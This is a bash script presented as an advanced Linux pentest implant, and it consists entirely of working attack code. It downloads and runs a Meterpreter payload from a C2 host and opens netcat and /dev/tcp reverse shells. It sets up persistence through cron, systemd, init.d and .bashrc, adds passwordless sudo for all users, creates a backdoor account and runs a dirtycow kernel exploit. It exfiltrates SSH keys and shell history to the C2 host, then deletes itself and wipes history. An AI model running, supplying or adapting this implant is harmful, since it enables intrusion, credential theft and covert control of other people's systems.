#!/bin/bash
# Advanced Linux pentest implant - Persistence + C2 + Privesc

# Config
C2_IP="YOUR_IP"
C2_PORT="4444"
METER_URL="http://${C2_IP}:8080/meterpreter.elf"

# 1. Drop Meterpreter (AV evasion)
cd /tmp
wget -q --no-check-certificate -O meter.elf "$METER_URL" || \
curl -s -o meter.elf "$METER_URL"

[ -f meter.elf ] && chmod +x meter.elf && nohup ./meter.elf -P "$C2_IP" -p "$C2_PORT" &

# 2. Reverse Shell Fallbacks (bash/wget/nc)
{
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "$C2_IP" 4445 >/tmp/f &
} || {
    bash -i >& /dev/tcp/$C2_IP/4446 0>&1 &
}

# 3. Persistence (5 methods)
{
    # Cron
    (crontab -l 2>/dev/null; echo "* * * * * /tmp/meter.elf -P $C2_IP -p $C2_PORT") | crontab -
    
    # Systemd
    echo "[Unit]\nDescription=Update\n[Service]\nExecStart=/tmp/meter.elf -P $C2_IP -p $C2_PORT\n[Install]\nWantedBy=multi-user.target" > /tmp/update.service
    systemctl enable /tmp/update.service 2>/dev/null || :
    
    # Autorun
    [ -d /etc/init.d ] && ln -s /tmp/meter.elf /etc/init.d/update
    
    # Bashrc
    echo "/tmp/meter.elf -P $C2_IP -p $C2_PORT &" >> ~/.bashrc
    
    # Sudoers (if possible)
    echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || :
    
} &

# 4. Privesc Attempts
{
    # SUID scanning
    find / -perm -4000 -type f 2>/dev/null | while read f; do $f 2>&1 | grep -q flag && $f; done &
    
    # Writeable /etc/passwd
    [ -w /etc/passwd ] && useradd -m backdoor -s /bin/bash -G sudo
    
    # Kernel exploits (common)
    cd /tmp; wget -q http://$C2_IP:8080/dirtycow && chmod +x dirtycow && ./dirtycow &
    
} &

# 5. Data Exfil
{
    # WiFi passwords
    wpa_cli -i wlan0 status 2>/dev/null | nc $C2_IP 4447 &
    
    # SSH keys
    tar czf - ~/.ssh 2>/dev/null | nc $C2_IP 4448 &
    
    # History
    history | nc $C2_IP 4449 &
    
} &

# 6. Self-clean + Hide
sleep 5
rm -rf /tmp/meter* /tmp/f $0
history -c && history -w
